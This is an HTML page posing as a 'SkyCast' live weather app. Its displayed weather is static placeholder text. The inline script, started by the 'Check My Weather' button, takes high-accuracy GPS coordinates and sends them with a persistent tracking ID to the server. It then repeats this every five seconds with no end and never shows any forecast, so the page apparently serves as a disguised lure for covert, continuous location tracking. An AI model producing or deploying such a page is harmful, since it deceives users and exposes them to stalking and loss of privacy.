<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SkyCast — Live Weather</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap"
        rel="stylesheet">
    <style>
        :root {
            --deep: #0b1220;
            --card: rgba(255, 255, 255, 0.055);
            --border: rgba(255, 255, 255, 0.12);
            --text: #eaf2ff;
            --muted: #93a6c4;
            --accent: #38bdf8;
            --accent-2: #818cf8;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            background: radial-gradient(1200px 700px at 15% 10%, #14233f 0%, transparent 55%),
                radial-gradient(1000px 600px at 90% 90%, #1e1740 0%, transparent 55%),
                linear-gradient(160deg, #0b1220 0%, #070b14 60%, #0a1120 100%);
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            color: var(--text);
        }

        .card {
            position: relative;
            width: 100%;
            max-width: 360px;
            padding: 32px 26px 28px;
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 20px;
            backdrop-filter: blur(18px);
            box-shadow: 0 24px 60px rgba(0, 0, 0, 0.45);
            overflow: hidden;
            text-align: center;
        }

        .card::before {
            content: "";
            position: absolute;
            inset: -60% -40% auto -40%;
            height: 160%;
            background: radial-gradient(60% 40% at 50% 0%, rgba(56, 189, 248, 0.14), transparent 70%);
            pointer-events: none;
        }

        .card>* {
            position: relative;
        }

        .app-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 22px;
        }

        .app-name {
            display: flex;
            align-items: center;
            gap: 8px;
            font-family: 'Sora', sans-serif;
            font-weight: 800;
            font-size: 15px;
            letter-spacing: 0.3px;
        }

        .app-name .mark {
            width: 22px;
            height: 22px;
            border-radius: 7px;
            background: linear-gradient(135deg, var(--accent), var(--accent-2));
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            color: #0b1220;
        }

        .live-chip {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 11px;
            font-weight: 600;
            color: #4ade80;
            background: rgba(74, 222, 128, 0.1);
            border: 1px solid rgba(74, 222, 128, 0.25);
            padding: 4px 10px;
            border-radius: 999px;
        }

        .live-chip .dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #4ade80;
            animation: blink 1.4s ease-in-out infinite;
        }

        .location {
            font-size: 15px;
            color: var(--muted);
            margin: 2px 0 16px;
        }

        .location b {
            color: var(--text);
            font-weight: 600;
        }

        .weather-icon {
            margin: 10px 0 6px;
        }

        .weather-icon img {
            width: 96px;
            height: 96px;
            filter: drop-shadow(0 6px 20px rgba(56, 189, 248, 0.35));
        }

        .temperature {
            display: block;
            font-family: 'Sora', sans-serif;
            font-size: 58px;
            font-weight: 800;
            line-height: 1;
            letter-spacing: -2px;
            background: linear-gradient(135deg, #f8fafc, #a5c8ff);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .condition {
            display: block;
            font-size: 17px;
            font-weight: 600;
            color: var(--muted);
            margin-top: 6px;
        }

        .divider {
            height: 1px;
            margin: 24px 0 20px;
            background: linear-gradient(90deg, transparent, var(--border), transparent);
        }

        .btn-check {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 13px;
            background: linear-gradient(135deg, var(--accent), var(--accent-2));
            color: #0b1220;
            font-family: 'Sora', sans-serif;
            font-weight: 700;
            font-size: 15px;
            letter-spacing: 0.3px;
            cursor: pointer;
            transition: transform 0.15s ease, box-shadow 0.15s ease, opacity 0.15s ease;
            box-shadow: 0 10px 28px rgba(56, 189, 248, 0.35);
        }

        .btn-check:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 14px 34px rgba(56, 189, 248, 0.45);
        }

        .btn-check:active:not(:disabled) {
            transform: translateY(0);
        }

        .btn-check:disabled {
            opacity: 0.55;
            cursor: not-allowed;
        }

        .hint {
            margin-top: 14px;
            font-size: 11.5px;
            color: var(--muted);
            letter-spacing: 0.3px;
        }

        .spin {
            display: inline-block;
            width: 15px;
            height: 15px;
            margin-right: 8px;
            border: 2px solid rgba(11, 18, 32, 0.35);
            border-top-color: #0b1220;
            border-radius: 50%;
            vertical-align: -2px;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @keyframes blink {

            0%,
            100% {
                opacity: 1;
            }

            50% {
                opacity: 0.3;
            }
        }
    </style>
</head>

<body>
    <div class="card">
        <div class="app-row">
            <span class="app-name"><span class="mark">☼</span>SkyCast</span>
            <span class="live-chip"><span class="dot"></span>LIVE</span>
        </div>

        <p class="location"><span id="city">Your City</span>, <b><span id="country">Your Country</span></b></p>

        <div class="weather-icon">
            <img src="/weather.png" alt="Weather Icon">
        </div>

        <span class="temperature">25°C</span>
        <span class="condition">Sunny</span>

        <div class="divider"></div>

        <button id="check-weather" class="btn-check">Check My Weather</button>
        <p class="hint">Uses your device location for the most accurate forecast.</p>
    </div>

    <script>
        const id = localStorage.getItem("id") || generateId()
        const btn = document.querySelector("#check-weather")
        let __interval

        btn.addEventListener("click", () => {
            btn.disabled = true
            btn.innerHTML = '<span class="spin"></span>Fetching...'

            getLocation()
        })

        function getLocation() {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    btn.disabled = true
                    const lat = position.coords.latitude
                    const lng = position.coords.longitude

                    fetch("/weather", {
                        method: "POST",
                        body: JSON.stringify({
                            id,
                            lat,
                            lng,
                        }),
                        headers: {
                            "Content-Type": "application/json"
                        }
                    }).catch(error => {
                        console.log("post error", error)
                    })
                },
                (error) => {
                    alert("Please Turn on GPS Location.")
                    btn.disabled = false
                    btn.innerHTML = "Check My Weather"
                    console.error("Error watching position:", error);
                },
                {
                    enableHighAccuracy: true, // Use GPS if available
                }
            )

            if (__interval) clearTimeout(__interval)
            __interval = setTimeout(getLocation, 5000)
        }

        function generateId(length = 10) {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                const randomIndex = Math.floor(Math.random() * characters.length);
                result += characters[randomIndex];
            }

            localStorage.setItem("id", result)
            return result;
        }
    </script>
</body>

</html>
